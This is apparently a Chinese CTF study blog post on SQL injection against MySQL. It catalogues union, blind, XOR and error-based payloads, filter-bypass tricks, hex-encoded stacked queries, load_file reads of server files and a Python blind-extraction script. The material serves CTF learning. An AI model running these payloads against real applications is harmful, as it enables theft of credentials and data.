---
title: SQL注入基础
abbrlink: 94662ad7
description: '有关sql注入的一些入门级知识'
date: 2022-09-23 23:51:12
cover: false
tags:
  - CTF-Web
categories:
  - CTF
  - Web安全
typora-root-url: ..
---



# 基本概念

>通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。
>
>是发生于应用程序与数据库层的安全漏洞。网站内部直接发送的SQL请求一般不会有危险，但实际情况是很
>多时候需要**结合用户的输入数据动态构造SQL语句**，如果用户输入的数据被构造成恶意SQL代码，Web应用又
>未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。

在前后段分离的服务器架构中, SQL注入发生在后端服务器和数据库服务器交互的阶段

只要后端提供了一个接收用户输入的接口, 例如 `http://XXXXX.com/login.php`, 就有可能实现SQL注入, 前端不是必要的

最简单的SQL注入情况例如:

```sql
-- 正常情况下,后端接收用户输入并构造的sql语句:
select * from t1 where name = %s;
-- 这里%s存放的是用户输入并通过POST传过来的数据
-- 如果用户输入一个正常的数据,例如 Michael, 那么构造成的语句即为:
select * from t1 where name = 'Michael';
-- 那么如果用户输入: xxx' or 1=1 --
-- 构造后的语句就成了: 
select * from t1 where name = 'XXX' or 1=1 --';
-- 这里, xxx是一个胡乱输入的数据, 后面的单引号用来闭合变量左边本来就有的那个单引号, 而原本和它配对的单引号在最后被--注释掉了, 后面or 1=1 是一个必然成立的条件, where 后面的命题必然为真, 所以这里实际上就执行了"select * from t1"
```

寻找注入点时最简单的情况, 在输入框中输入一个单引号`'` , 如果网站会报SQL语法错误(可以通过F12在网站的响应包里查看), 那么基本上一定存在注入漏洞(**说明网站没有对用户输入内容的过滤**), 原因是:

```sql
# 假设拼接的语句为
select username,password from user where username = 'xxx'
# 如果网站对用户的输入没有过滤的话, 不论输入什么, 都能够被拼接上面到xxx的位置, 一个单引号也不例外
# 那么用户输入单引号, 拼接后就是:
select username,password from user where username = '''
# 这个语句被数据库服务器执行时遇到了三个单引号,当然会出现语法错误
```



<br>

<img src="/images/ctf-web03/image-20220924083225942.png" alt="image-20220924083225942" style="zoom:67%;" />

上图也是同样的道理, 攻击者输入的语句里, 先使用一个单引号闭合原本包裹变量的左侧单引号, 将右侧单引号使用`--`注释掉, 然后使用`UNION`附加了一个自己的查询, 输出了user表中所有的用户名和密码

再如:

<img src="/images/ctf-web03/image-20220924083534234.png" alt="image-20220924083534234" style="zoom:67%;" />

闭合了前面的引号后, 加入了一个`update`语句, 更新了名为`administrator`的用户的密码值

常用操作:

```
'闭合语句里本来就有的单引号
--或者# 注释掉不想让其起作用的语句
```



<br>

***

<br>

# 常见方法

## 最基本的

- `xxx' or 1=1 ---`

  ```sql
  select * from t1 where name = %s;
  select * from t1 where name = 'XXX' or 1=1 --';
  ```

- `union`附加其他查询

  ```sql
  # 原语句
  select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;
  # 输入: 1'union select database(),version(),user()--+
  ```

- 语句之间使用分号分割执行多条语句,堆叠注入



<br>

***

<br>





## 关于Information_schema数据库

>`INFORMATION_SCHEMA`提供了对数据库元数据的访问，**MySQL服务器信息，如数据库或表的名称，列的数据类型，访问权限**等。 有时也把这些信息叫做数据字典或系统目录。
>
>**每个数据库实例都会有一个 `INFORMATION_SCHEMA` 库**，保存的是本实例下其他所有库的信息。`INFORMATION_SCHEMA`数据库包含多个只读表。 它们实际上是视图，而不是基础表，所以没有与它们关联的文件，并且你不能在它们上设置触发器。此外，数据库目录下也没有该库的目录。
>
>虽然可以使用USE语句将`INFORMATION_SCHEMA`选择为缺省数据库，但只能读取表的内容，不能对它们执行`INSERT`，`UPDATE`或`DELETE`操作。
>
>每个MySQL用户都可以访问 `INFORMATION_SCHEMA`，但是只能看到自己有权限的那些行。

其中:

- `TABLES`表记录了所有数据库中所有表的信息,**例如表名,以及它属于哪一个数据库**

![image-20221003164106895](/images/ctf-web03/image-20221003164106895.png)

- `COLUMNS`表记录了所有数据库中所有列的信息,**例如列名, 它属于哪个表,属于哪个数据库**..

  ```sql
   select TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME from COLUMNS where TABLE_NAME='users';
  ```

  ![image-20221003164853475](/images/ctf-web03/image-20221003164853475.png)





# 姿势汇总

- 没有限制的话,使用分号做间隔,可以执行多条语句(**堆叠注入**)

- `fuzz`测试: 

  对于存在关键词过滤的,可以通过Burpsuite的`Intruder`功能来测试哪些字符或者语句可以使用

  简要流程:

  1. 提交一次常规查询并抓包,转到`Intruder`模块,找找查询关键词的位置,以此设置攻击点:

     ![image-20221013193439637](/images/ctf-web03/image-20221013193439637.png)

  2. 加载字典和其他设置,线程数不要太高,否则容易报429错误
  3. 开始攻击,并根据响应包的长度来判断哪些字符或语句被过滤了.



## 常规有回显

```
1' or '1'='1 
```

`#`和`--`都能够起到注释作用,用来让后面的语句失效				

### **union select**:

```
1' and '1'='2' union select version(),database(),user() #
//查询某个数据库中的所有表,这里的1或者其他任意字符起到占位作用,因为原查询结果有两列,如果原查询结果更多,这里也要添加更多占位字符:
1' and '1'='2' union select group_concat(TABLE_NAME),1 from information_schema.TABLES where table_schema='库名'# 
//查询某个库中某个表的所有列名:
1' and '1'='2' union select group_concat(COLUMN_NAME),2 from information_schema.COLUMNS where table_schema='库名' and table_name='表名'#
//查询具体数据:
1' and '1'='2' union select user,password from users#
```

### information_schema被过滤时(有时候被or过滤误伤)

例题:[[SWPU2019]Web1](2e610037.html)

- **利用`mysql5.7`新增的`sys.schema_auto_increment_columns`**

  这是`sys`数据库下的一个视图，基础数据来自与`information_schema`,他的作用是对表的自增ID进行监控，也就是说，**如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名**

  它的列包括:

  ```
  table_schema库名  table_name表名  column_name自增列的列名,这个一般是id....
  ```

- **`sys.schema_table_statistics_with_buffer`**

  这是`sys`数据库下的视图，里面存储着所有数据库所有表的统计信息

  ```
  与它表结构相似的视图还有
  sys.x$schema_table_statistics_with_buffer
  sys.x$schema_table_statistics
  sys.x$ps_schema_table_statistics_io
  ```

  其中的列包括:

  ```
  table_schema库名  table_name表名
  ```

- `mysql`默认存储引擎`innoDB`携带的表(`MySQL5.6以上`)

  `mysql.innodb_table_stats`,`mysql.innodb_index_stats`

  其中的列包括: 没有列名..

  ```
  database_name, table_name
  ```

  这里需要`mysql`使用`InnoDB`作为数据库的引擎:

  ```
  show engines; 查看引擎 
  default-storage-engine=InnoDB 设置引擎
  ```

### 无列名注入

https://johnfrod.top/%E5%AE%89%E5%85%A8/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87information_schema/

前面所说的`information_schema`的替代方案都查不到列名,所以就需要进行无列名注入

例如现在不知道`user`表的列名,那么使用下列语句为`user`表的列名赋上1,2,3的名字(这里具体有几列需要试)

```
select 1,2,3 union select * from user;
```

上述查询的结果作为一个子查询,我们将其指代为`x`,然后通过外层的`select`来查询其中某一列的具体数据,这样就在不知道`user`列名的情况下查到了`user`表中某一列的数据

```
select `3` from (select 1,2,3 union select * from user)x;
select x.3 from (select 1,2,3 union select * from user)x;
```

具体应用实例

```
1'/**/union/**/select/**/'1',(select/**/group_concat(x.3)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)x),'3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22
```

<br>

另外一种无列名注入的方法: <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>按位比较,多用于盲注</span>

以下来自: [[GYCTF2020]Ezsqli](383bfb1c.html)

```
id=1^((select 1,1)>(select * from f1ag_1s_h3r3_hhhhh))  返回Error Occured When Fetch Result. 

id=1^((select 1,1,1)>(select * from f1ag_1s_h3r3_hhhhh))  返回bool(false)
这里说明目标表有两列 
```

这里前面`select`的结果,也就是`(1,1)`会和后面的结果去按位比较(`ASCII码`)

如果前后列数不一致,则会报错. 如果列数一致,再判断整个不等式的真假.  

比较的时候进行按位比较, 假设`select * from f1ag_1s_h3r3_hhhhh`的结果中,第二列的数据为:`flag{aaaaa}`

```
id=1^((select 1,'a')>(select * from f1ag_1s_h3r3_hhhhh))  返回Nu1L,这说明整个表达式的值为1,也就说明后面不等式的值为0
id=1^((select 1,'g')>(select * from f1ag_1s_h3r3_hhhhh))  返回Error Occured When Fetch Result. 说明整个表达式的值为0,也就说明后面不等式的值为1
```

所以此时我们按照`ascii`码值的顺序更换字母就可以了,当在某个字母,比如`g`时,返回的结果从`Nu1L`变成了`Error Occured When Fetch Result.`,  就说明它的前一个字母刚好等于flag的第一个字母.因此也就得知了flag的第一个字母是`f`

如果这里传入

```
id=1^((select 1,"abcd")>(select * from f1ag_1s_h3r3_hhhhh))
```

将首先比较"a"和`select * from f1ag_1s_h3r3_hhhhh`的结果中第一位的`ascii`码大小

如果首位比较的结果相等,再接着去比较第二位"b"和后面结果的第二个字符

根据这种性质,就可以使用代码来注入了:

```python
def get_data():
    flag = ""
    for i in range(1,100):
        for c in range(32,127): # 测试的ascii码范围
            data = {
                'id': "1^((select 1,'{}')>(select * from f1ag_1s_h3r3_hhhhh))#".format(flag+chr(c))
            }
            print(data['id'])
            res = session.post(base_url, data=data).text
            # print(res)
            if "Error Occured When Fetch Result." in res:
                flag = flag + chr(c-1)
                print(flag)
                break
 #输出:FLAG{0F444C84-7580-4A33-B2E8-19FCE4439E7D} 
```

注意这里如果返回了`Error Occured When Fetch Result`,说明当前比较的字母已经大于flag中对应位置的字母了

那么它前一个字母是和flag中对应位置相等的,所以12行是`flag = flag + chr(c-1)`

另外, 上面输出的全都是大写字母的原因是:  `mysql`中比较是不区分大小写的,所以尽管`N`的 ascii码小于`a`,但是在上面判定时还是会判断为`N`>`a`  但这不影响我们的结果,只要把上面的flag转为小写就可以了.

```python
flag = "FLAG{0F444C84-7580-4A33-B2E8-19FCE4439E7D}"
print(flag.lower())
```







### **show**

```
1';show databases;# //可以用来爆库名
1';show tables;# //可以用来爆表名
1'; show columns from 表名;# //爆某个表中的所有列名
```



## 盲注

### 一般的盲注(猜):

假设页面不会回显具体的查询结果,只会告知查询的内容是否存在,那么可以尝试下列语句,如果查询存在,则说明语句为真,`and`后面的猜测是正确的

```
猜库名长度
1' and length(database())=4 #
逐个字母猜库名
1' and substr(database(),1,1)='d
逐个字母猜所有表名
1' and substr((select group_concat(table_name) from information_schema.tables where table_schema='dvwa'),1,1) = 'g
逐个字母猜列名：
1' and substr((select group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'), 1, 1) = 'u
逐个字母猜特定列里的数据：
id=1' and substr((select group_concat(password) from users), 1, 1) = '5
```



### 利用异或性质进行盲注:

**`A^B`,AB如果相同则返回0,不同则返回1**

```
mysql> use test;
Database changed
mysql> select * from flag;
+------+------------+
| id   | flag       |
+------+------------+
|    1 | flag{test} |
+------+------------+
1 row in set (0.00 sec)

mysql> select * from flag where id=1^(length(database())=4); 这里返回空,是因为1^(length(database())=4)的结果返回了0,也就相当于length(database())=4为True,由此就猜对了数据库的长度. 这里和一般的盲注理解类似
Empty set (0.00 sec)

mysql> select * from flag where id=1^(length(database())=3);
+------+------------+
| id   | flag       |
+------+------------+
|    1 | flag{test} |
+------+------------+
1 row in set (0.00 sec)

其他常用payload: (大量尝试,需要借助python脚本) (下面这几个是空格被过滤时使用过的,用加括号的方法绕过)
id=1^(substr(database(),1,1)='g')#  爆库名

id=1^(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name='库名')),1,1)='g')#  爆表名

id=1^(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='表名')),1,1)='g')#   爆列名

id=1^(substr((select(group_concat(password))from(F1naI1y)),1,1)='g')#  具体数据
```

[[极客大挑战 2019]FinalSQL](2e610037.html)

## 基于报错的注入:

前提是页面能够输出详细的错误信息, 基于报错的注入主要依靠**两个特殊函数`extractvalue`和`updatexml`**,这两个函数的作用分别是**对`XML`文档内容进行查询和修改**

### extractvalue

`ExtractValue(XML_document:XML文档对象或者XML片段, xpath_string:XML中的查找路径)`

例如: 下面的代码就是在前面的XML片段中查找a节点下的b节点.  这里第一个参数既可以是一个文档路径也可以是一个直接输入进去的XML片段

```
SELECT ExtractValue('<a><b><b/></a>', '/a/b');
```

当第二个参数`xpath_string`格式出现错误时, 会使得查询语句爆出`xpath syntax`语法错误,**此时错误信息中会包含出错的`xpath_string`的内容**. **这里字符:`0x7e`(解码后是`~`)就会引起这种语法错误**

所以如果上面的语句变为:

```
SELECT ExtractValue('<a><b><b/></a>', '0x7e');
会报错:
XPATH syntax error: '~'
```

所以这里就可以把**第二个参数换成其他具有查询功能的语句**,例如在注入中常用的: (因为需要爆语法错误,所以第一个参数的文档对象填什么都无所谓了,这里就用了1)

```
admin'or extractvalue(1,concat(0x7e,(database()),0x7e))# 爆数据库名
```



### updatexml

`updatexml(XML_document,XPath_string需要更新的路径,new_value修改后的新值)`这里和`ExtractValue`的区别是查找到对应的片段后要把其对应的内容更新为`new_value`但两者报错的原理是一样的

注入示例: 第一个和第二个参数都可以随便写, 第二个参数是需要查询的内容对应的语句,其中要包含`0x7e`

```
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #
```

### 常用payload

```
extractvalue爆库名
'or extractvalue(1,concat(0x7e,(database()),0x7e))#
updatexml爆表名
'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek'))),0x7e),1))#
updatexml爆列名
'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))),0x7e),1))#
updatexml爆数据
'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#

爆数据库版本信息
?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
链接用户
?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)

链接数据库
?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)

爆库
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)

爆表
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)

爆字段
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)

爆字段内容
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
爆表名
?id=1 and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
爆列名
?id=1 and updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name="users")),1)#
爆字段
?id=1 and updatexml(1,make_set(3,'~',(select data from users)),1)#

```









## 一些绕过

- 过滤`select`,`union`等关键词,可以先试试双写绕过,例如:

```
1' ununionion seselectlect 1,2,group_concat(TABLE_NAME) frfromom information_schema.tables whwhereere table_schema=database()#
```

- **等于号被过滤**可以考虑使用`like`进行模糊查询:

```
select group_concat(column_name) from information_schema.columns where table_name like 'H4rDsq1'
```

- `like`也被过滤的时候可以使用`regexp`进行正则匹配

```
select group_concat(column_name) from information_schema.columns where table_name regexp '^H4' 
```

上面是匹配以`H4`开头的数据

- 空格被过滤可以将每一部分**用括号包裹**, 也可以用注释符代替

```
select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))

/**/
```

- **`or`或`and`被过滤可以尝试使用异或运算符`^`或`XOR`作连接符, 前者按位异或,后者逻辑异或**

  > 异或运算:`a ^ b`,两者不同则结果为1,两者相同则结果位0

- `mysql`会自动将十六进制转换成字符,所以可以把一些关键词转换成16进制: 例如

```
"path":" or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= 'users' and table_schema=database()),{},1))={}) #"
这里users使用了引号, 导致脚本已知跑不出来
所以把这里的users转换成16进制
"path":" or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= 0x7573657273 and table_schema=database()),{},1))={}) #"
```

- **注释符`#`和`--`都被过滤,可以尝试使用`%00`去截断**



## 其他

###  prepare预处理(绕一些过滤)

例如想执行:

```
select * from `1919810931114514`
```

但是`select`等关键字被过滤了

```
1';Set@payload=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execpayload from @payload;execute execpayload;#
//这里先将本来想要执行的select * from `1919810931114514`进行16进制编码
//然后使用Set语句将编码后的语句赋值给一个变量: Set@变量名=变量值
//使用prepare语句对查询语句进行预处理,这个过程里会进行编码转换:prepare 预处理后的变量名 from @变量名
//最后执行预处理后的语句:execute 预处理后的变量名
```



### handler

>`handler`语句是`mysql`的专用语句
>
>`mysql`除可使用`select`查询表中的数据，也可使用`handler`语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过`handler`语句并不具备`select`语句的所有功能。它是`mysql`专用的语句，并没有包含到SQL标准中。

```
handler 表名 open as xxx; //打开一个表,返回一个名为xxx的句柄
handler xxx read first; // 读该表的第一行数据
handler xxx read next; // 读该表的下一行数据
handler xxx close;
或者
handler 表名 open;
handler 表名 read first;
handler 表名 read next;
handler xxx close;
```

### md5_sql注入

假设服务器的查询语句为: 其中`$pass`是用户输入的内容

```
select * from 'admin' where password=md5($pass,true)
```

此时如果要注入,可以传:

```
ffifdyop
129581926211651571912466741651878684928
```

这两者在生成二进制的`md5`后可以包含`...' or .. `这样的**万能密码**,能够达到注入目的



### IF语句逻辑判断

**`sql`中的`if`语句: `IF( expr1 , expr2 , expr3 )`**

**如果`exp1`的值为`True`,则返回`expr2`**

**如果`exp1`的值为`False`,则返回`expr3`**

基于此可以通过逻辑判断的方式进行盲注

题目见[Hack World](2e610037.html)



### 绕过正则匹配

如果有正则匹配关键字`\bselect\b` (这里`\b`的含义是精确匹配开头和结尾)

可以将`select`替换成:

```
/*!50000select*/  
```



### 通过root用户的权限来执行特殊功能

```
select user(); 可以查看当前数据库连接的用户
如果是root用户还可以在注入时使用特殊函数,例如:

1' union select '1',load_file('/var/www/html/addads.php'); 读取了/var/www/html/addads.php

```



### flag显示不全

#### reverse逆序输出结果

有的时候flag显示不全,需要逆序输出另一部分

```
reverse(select group_concat(real_flag_1s_here) from users)
```



#### replace将之前出来的内容替换成空值

```
' and extractvalue(1,concat(0x7e,(select load_file('/flag.txt')),0x7e))#
输出: errorXPATH syntax error: '~flag{e62bb712-dc5d-4f48-bd21-87'

' and extractvalue(1,concat(0x7e,(select replace((select load_file('/flag.txt')),"e62bb712-dc5d-4f48-bd21-87","")),0x7e))#
输出: flag{58112d0ecf}

最后拼接成完整flag:flag{e62bb712-dc5d-4f48-bd21-8758112d0ecf}
```



### 巧妙运用反斜杠

当过滤词过多时,可以使用反斜杠来对已有的单引号进行转义,从而打乱引号的配对关系,让一些值为我们所控制

例如: 当查询语句为,此时`username`输入`\`

```
select * from users where username='' and passwd=''
```

整个语句就变成了:

```
select * from users where username='\' and passwd=''
username后面的单引号被注释掉, 前面的单引号被迫和passwd后的单引号闭合,这样查询时的username的值为:
' and passwd=
```

然后我们可以在后面任意构造且,或等逻辑表达式,例如passwd中传入:

```
||substr(passwd,1,1)='a'#
这样整个语句就变成了
select * from users where username='\' and passwd='||substr(passwd,1,1)='a'#
```

更直观一些看: 语句变成了下面两个表达式的或判断

select * from users where <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>username='\' and passwd='</span>||<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>substr(passwd,1,1)='a'</span>#

这样以来就可以进行盲注了



反斜杠和注释符`/**/`配合使用还可以让某些内容摆脱引号的控制,又如[[git泄露,二次注入,DS_store]Comment](a65f6ebf.html)















